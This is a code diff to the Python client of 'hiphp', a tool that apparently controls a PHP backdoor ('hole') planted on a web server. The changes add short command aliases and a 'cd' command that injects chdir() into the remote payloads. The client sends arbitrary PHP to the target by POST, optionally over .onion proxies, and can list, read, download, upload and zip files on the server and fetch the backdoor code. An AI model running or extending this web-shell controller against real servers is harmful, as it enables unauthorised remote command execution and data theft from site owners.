@@ -60,16 +60,18 @@ class hiphp:
         self.c_green="#34a853"#green
         #
         self.set=""
+        self.cd=""
         self.do_x=0
 
     #cli:
     def cli(self):
-        #
+        #logo
         logox=""
         if self.do_x==0:
             logox=logo(__version__)
             self.do_x+=1
-        #
+
+        #getcwd
         getcwd=""
         reee=hiphp.do(self,self.key,self.url,self.headers,True,"echo getcwd();")
         if emsg_1 in reee:
@@ -93,23 +95,23 @@ class hiphp:
         #    exit()
         if command and command!="":
             #help
-            if command[0:6].lower()=="--help":
+            if command[0:6].lower()=="--help" or command[0:4].lower()=="help":
                 help_c=command.split(" ")
                 try:
                     help(help_c[1])
                 except:
                     print(help())
             #exit
-            elif command[0:6].lower()=="--exit":
+            elif command[0:6].lower()=="--exit" or command[0:4].lower()=="exit":
                 exit()
             #license
-            elif command[0:9].lower()=="--license":
+            elif command[0:9].lower()=="--license" or command[0:7].lower()=="license":
                 print(license())
             #about
-            elif command[0:7].lower()=="--about":
+            elif command[0:7].lower()=="--about" or command[0:5].lower()=="about":
                 print(about())
             #download
-            elif command[0:6].lower()=="--down":
+            elif command[0:6].lower()=="--down" or command[0:4].lower()=="down":
                 down=command.split(" ")
                 try:
                     if down[1].lower()=="-f":
@@ -151,7 +153,7 @@ class hiphp:
                 except:
                     help("--down")
             #zip
-            elif command[0:5].lower()=="--zip":
+            elif command[0:5].lower()=="--zip" or command[0:3].lower()=="zip":
                 ziping=command.split(" ")
                 try:
                     zip_file_name=hiphp.compress(self,ziping[1])
@@ -160,8 +162,8 @@ class hiphp:
                 print(smsg_2+reee+"/"+zip_file_name)
 
             #update
-            elif command[0:8].lower()=="--update":
-                r = "https://raw.githubusercontent.com/yasserbdj96/hiphp/main/version.txt"
+            elif command[0:8].lower()=="--update" or command[0:6].lower()=="update":
+                r="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/version.txt"
                 version = requests.get(r).text
                 version=version.replace('\n', ' ').replace('\r', '').replace(' ', '')
                 if version==__version__:
@@ -181,15 +183,27 @@ class hiphp:
                 else:
                     print(msg_4)
             #ls
-            elif command[0:4].lower()=="--ls":
-                if len(command)==4:
+            elif command[0:4].lower()=="--ls" or command[0:2].lower()=="ls":
+                if len(command)==4 or len(command)==2:
                     command=scandir()
-                elif command[5:9].lower()=="-all":
+                elif command[0:4].lower()=="--ls" and command[5:9].lower()=="-all":
                     dirx=command[10:]
-                    if dirx=="":dirx="./"
+                    if dirx=="":
+                        dirx="./"
+                    command=scandir_all(dirx)
+                elif command[0:2].lower()=="ls" and command[3:7].lower()=="-all":
+                    dirx=command[8:]
+                    if dirx=="":
+                        dirx="./"
                     command=scandir_all(dirx)
                 else:
-                    dirx=command[5:]
+                    if len(command)==4:
+                        dirx=command[5:]
+                    else:
+                        dirx=command[3:]
+                    
+                    if dirx[-1]!="/":
+                        dirx+="/"
                     command=scandir(dirx)
                 sd=hiphp.do(self,self.key,self.url,self.headers,True,command)
                 x=ast.literal_eval(sd)
@@ -197,49 +211,62 @@ class hiphp:
                 for i in range(len(x)):
                     if x[i]!="." and x[i]!="..":
                         x[i]=x[i].replace("\/","/")
-                
                 biglibrary().lslist(x,separator=" | ")
             #set
-            elif command[0:5].lower()=="--set":
-                self.set+=command[6:]
+            elif command[0:4].lower()=="--cd" or command[0:2].lower()=="cd":
+                self.cd=""
+                if command[0:4].lower()=="--cd":
+                    self.cd=f"chdir('{reee}/{command[5:]}');"
+                else:
+                    self.cd=f"chdir('{reee}/{command[3:]}');"
+            #set
+            elif command[0:5].lower()=="--set" or command[0:3].lower()=="set":
+                if command[0:5].lower()=="--set":
+                    self.set+=command[6:]
+                else:
+                    self.set+=command[4:]
             #delete set
-            elif command[0:6].lower()=="--dset":
+            elif command[0:6].lower()=="--dset" or command[0:4].lower()=="dset":
                 self.set=""
             #clear
-            elif command[0:5].lower()=="--cls":
+            elif command[0:5].lower()=="--cls" or command[0:3].lower()=="cls":
                 os.system('cls' if os.name == 'nt' else 'clear')
             #Get the hole Code
-            elif command[0:6].lower()=="--geth" or command[0:15].upper()=="HIPHP_HOLE_CODE":
+            elif command[0:6].lower()=="--geth" or command[0:15].upper()=="HIPHP_HOLE_CODE" or command[0:4].lower()=="geth":
                 hiphp.get_hole(self,get=True)
             #cat
-            elif command[0:5].lower()=="--cat":
-                dirx=command[6:]
+            elif command[0:5].lower()=="--cat" or command[0:3].lower()=="cat":
+                if command[0:5].lower()=="--cat":
+                    dirx=command[6:]
+                else:
+                    dirx=command[4:]
                 command=file_get_contents(dirx)
                 hiphp.do(self,self.key,self.url,self.headers,False,command)
             #php_info:
-            elif command[0:9].lower()=="--phpinfo":
+            elif command[0:9].lower()=="--phpinfo" or command[0:7].lower()=="phpinfo":
                 command=php_info()
                 hiphp.do(self,self.key,self.url,self.headers,False,command)
             #rf
-            elif command[0:4].lower()=="--rf":
+            elif command[0:4].lower()=="--rf" or command[0:2].lower()=="rf":
                 varss=command.split(" ")
                 
                 if varss[len(varss)-1]=="":
                     del varss[len(varss)-1]
                 print(hiphp.run_file(self,varss[1],varss[2:]))
             #up
-            elif command[0:4].lower()=="--up":
-                v=command[5:].split(" ")
-                if len(v)>1:
+            elif command[0:4].lower()=="--up" or command[0:2].lower()=="up":
+                v=command.split(" ")
+                #print(v)
+                if len(v)>2:
                 #try:
-                    file_path=v[0]
-                    to=v[1]
+                    file_path=v[1]
+                    to=v[2]
                     if to[len(to)-1:len(to)]!="/":
                         to=to+"/"
                     hiphp.upload(self,file_path,to)                    
                 #except:
                 else:
-                    hiphp.upload(self,command[5:].split(" ")[0])
+                    hiphp.upload(self,command.split(" ")[1])
             else:
                 hiphp.do(self,self.key,self.url,self.headers,False,command)
         else:
@@ -262,7 +289,7 @@ class hiphp:
                 key_len=len(key)+1
                 # if the key are true:
                 if response.text[0:key_len]=="#"+key:
-                    ploads={'command':self.set+command}
+                    ploads={'command':self.cd+self.set+command}
                     if ".onion" in url:
                         response=requests.post(url,headers=header,data=ploads,proxies=proxies)
                     else:
@@ -360,7 +387,6 @@ class hiphp:
         if self.retu==False:
             print(down_path)
         return down_path
-
 
     #get the hole:
     def get_hole(self,get=False):
